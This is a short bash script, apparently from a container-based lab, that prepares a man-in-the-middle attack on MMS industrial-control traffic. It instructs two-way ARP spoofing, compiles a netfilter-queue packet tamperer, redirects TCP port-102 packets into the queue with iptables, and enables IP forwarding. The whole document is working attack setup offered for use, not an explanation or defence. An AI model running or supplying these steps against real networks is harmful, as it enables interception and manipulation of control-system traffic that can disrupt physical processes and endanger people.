#!/bin/bash
echo "[+] BE CAREFUL: this script is intended to run while arpspoofing is in progress!"
echo "[+] If it isn't run in two different terminal:"
echo "[+] TERMINAL 1: arpspoof ip1 ip2"
echo "[+] TERMINAL 2: arpspoof ip2 ip1"
echo "[+] KEEP THOSE TERMINALS OPEN DURING THE ATTACK"
echo "[+] to open multiple terminals in the same container:"
echo "[+] docker exec -it <container> bash"
g++ -o mms_nfq mms_nfq.cpp -lnetfilter_queue
iptables -t mangle -A POSTROUTING -p tcp --sport 102 -j NFQUEUE
sysctl -w net.ipv4.ip_forward=1
echo "[+] Everything is set up!"
echo "[+] Now run ./mms_nfq"
